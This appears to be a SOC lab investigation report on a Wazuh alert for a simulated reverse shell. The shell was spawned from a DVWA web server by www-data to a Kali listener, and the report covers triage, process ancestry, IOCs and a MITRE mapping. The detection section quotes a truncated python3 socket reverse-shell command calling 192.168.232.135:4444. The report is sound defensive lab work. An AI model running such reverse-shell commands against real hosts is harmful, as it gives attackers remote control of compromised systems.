# Investigation — Stage 06 — Reverse Shell

> **Status:** Completed  
> **Attack stage:** [Stage 06](../../02-Attack-Simulation/Stages/stage-06-reverse-shell.md)  
> **TheHive case:** [Web Application Compromise](../Cases/case-01-web-compromise.md)  

---

## Alert details

| Field | Value |
|---|---|
| **Alert ID** | `wzb-a2f073998b` |
| **Rule ID** | `Wazuh 100602 (Level 8)` |
| **Source** | Wazuh Auditd & bashcmd decoder on DVWA |
| **Severity** | High |
| **TLP / PAP** | `TLP:AMBER / PAP:AMBER` |

---

## What was detected

Wazuh Rule 100602 matched on interactive shell execution from www-data: python3 -c import socket,subprocess,os;s=socket.socket... connecting outbound to 192.168.232.135:4444.

---

## Triage

| Question | Answer |
|---|---|
| **Verdict** | True Positive |
| **Confidence** | High |
| **Rationale** | Outbound socket connection spawned by Python interpreter executed by the web server service account (www-data). |

---

## Investigation steps

1. Inspected Wazuh alert wzb-a2f073998b for exact command line captured by custom bashcmd decoder.
2. Verified outbound network socket from DVWA (192.168.56.30) to Kali (192.168.232.135) on port 4444/TCP.
3. Checked process ancestry: apache2 -> sh -> python3.
4. Confirmed active interactive shell session established.
5. Prepared host isolation action in TheHive case task.

---

## Evidence

- **Attack Evidence:** [`../../02-Attack-Simulation/Attack-Screenshots/19.png`](../../02-Attack-Simulation/Attack-Screenshots/19.png)
- **Alert Evidence:** [`../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png`](../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png)
- **Raw Telemetry:** Exported in [`06-Resources/Alerts/wazuh_alerts.csv`](../../06-Resources/Alerts/wazuh_alerts.csv) and [`thehive_alerts.json`](../../06-Resources/Alerts/thehive_alerts.json)

---

## Indicators of Compromise (IOCs)

| Type | Value | Context |
|---|---|---|
| Process | `python3` | Reverse shell executor |
| Destination | `192.168.232.135:4444` | Attacker C2 listener |
| User | `www-data` | Compromised service account |

---

## Detection assessment

- **Status:** Detected
- **Gap ID:** None
- **Engineering Assessment:** Custom bashcmd decoder successfully parsed the full command line with regex matching, triggering Level 8 escalation.

---

## Verdict

Confirmed True Positive reverse shell established from DVWA to Kali.

---

## MITRE ATT&CK

- **Tactic:** Execution
- **Technique:** Command and Scripting Interpreter: Unix Shell (T1059.004)
